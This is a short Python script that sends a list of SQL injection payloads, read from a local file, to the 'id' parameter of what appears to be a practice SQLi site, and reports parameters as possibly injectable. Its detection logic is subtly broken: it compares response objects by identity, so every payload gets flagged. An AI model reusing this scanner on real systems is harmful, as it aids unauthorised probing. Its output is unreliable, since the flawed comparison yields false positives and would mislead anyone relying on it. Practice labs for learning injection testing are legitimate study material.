import urllib.parse
import requests

def LoadPayloads():
    file = open('sqli_payloads.txt', 'rb')
    payloads = file.readlines()
    file.close()
    return payloads

url = 'https://www.zixem.altervista.org/SQLi/level1.php'
parameter = 'id'
correct_value = '1'
incorrect_value = 'dzadhazoiud'

correct_response = requests.get(f'{url}?{parameter}={correct_value}')
incorrect_response = requests.get(f'{url}?{parameter}={incorrect_value}')

payloads = LoadPayloads()

for payload in payloads:
    encoded_payload = urllib.parse.quote(payload)
    payload = payload.decode("utf-8").replace('\n','')
    payload_response = requests.get(f'{url}?{parameter}={encoded_payload}')
    if payload_response != correct_response and payload_response != incorrect_response:
        print(f'Parameter {parameter} might be injectable with payload : {payload}')